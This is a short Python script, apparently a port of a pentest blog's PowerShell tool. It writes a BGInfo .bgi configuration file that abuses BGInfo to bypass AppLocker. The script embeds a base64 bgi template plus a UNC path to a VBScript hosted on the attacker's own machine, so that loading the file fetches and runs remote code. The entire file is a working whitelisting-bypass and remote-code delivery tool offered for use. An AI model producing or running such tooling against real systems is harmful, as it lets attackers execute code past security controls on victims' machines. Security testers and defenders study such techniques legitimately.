'''
Converted the Powershell script on the following blogpost to python: 
https://pentestlab.blog/2017/06/05/applocker-bypass-bginfo/

Thist script will dinamically generate a valid bgi file using the IP address of the Attacker machine.
'''

import base64, struct, socket

def get_ip_address():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    return s.getsockname()[0]

filePath = "\\\\" + get_ip_address() + "\\update\\script.vbs"
stringLenght = len(filePath) + 2
 
fileContent = base64.b64decode("CwAAAEJhY2tncm91bmQABAAAAAQAAAAAAAAACQAAAFBvc2l0aW9uAAQAAAAEAAAA/gMAAAgAAABNb25pdG9yAAQAAAAEAAAAXAQAAA4AAABUYXNrYmFyQWRqdXN0AAQAAAAEAAAAAQAAAAsAAABUZXh0V2lkdGgyAAQAAAAEAAAAwHsAAAsAAABPdXRwdXRGaWxlAAEAAAASAAAAJVRlbXAlXEJHSW5mby5ibXAACQAAAERhdGFiYXNlAAEAAAABAAAAAAwAAABEYXRhYmFzZU1SVQABAAAABAAAAAAAAAAKAAAAV2FsbHBhcGVyAAEAAAABAAAAAA0AAABXYWxscGFwZXJQb3MABAAAAAQAAAACAAAADgAAAFdhbGxwYXBlclVzZXIABAAAAAQAAAABAAAADQAAAE1heENvbG9yQml0cwAEAAAABAAAAAAAAAAMAAAARXJyb3JOb3RpZnkABAAAAAQAAAAAAAAACwAAAFVzZXJTY3JlZW4ABAAAAAQAAAABAAAADAAAAExvZ29uU2NyZWVuAAQAAAAEAAAAAAAAAA8AAABUZXJtaW5hbFNjcmVlbgAEAAAABAAAAAAAAAAOAAAAT3BhcXVlVGV4dEJveAAEAAAABAAAAAAAAAAEAAAAUlRGAAEAAADvAAAAe1xydGYxXGFuc2lcYW5zaWNwZzkzNlxkZWZmMFxkZWZsYW5nMTAzM1xkZWZsYW5nZmUyMDUye1xmb250dGJse1xmMFxmbmlsXGZjaGFyc2V0MTM0IEFyaWFsO319DQp7XGNvbG9ydGJsIDtccmVkMjU1XGdyZWVuMjU1XGJsdWUyNTU7fQ0KXHZpZXdraW5kNFx1YzFccGFyZFxmaS0yODgwXGxpMjg4MFx0eDI4ODBcY2YxXGxhbmcyMDUyXGJccHJvdGVjdFxmMFxmczI0IDx2YnM+XHByb3RlY3QwXHBhcg0KXHBhcg0KfQ0KAAALAAAAVXNlckZpZWxkcwAAgACAAAAAAAQAAAB2YnMAAQAAAA==")

with open("/tmp/payloads/script.bgi", "wb") as bgi_file:
    bgi_file.write(fileContent)
    bgi_file.write(struct.pack("B", stringLenght))
    bgi_file.write(b'\x00\x00\x00\x34')
    bgi_file.write(filePath.encode('ascii'))
    bgi_file.write(b'\x00\x00\x00\x00\x00\x01\x80\x00\x80\x00\x00\x00\x00')

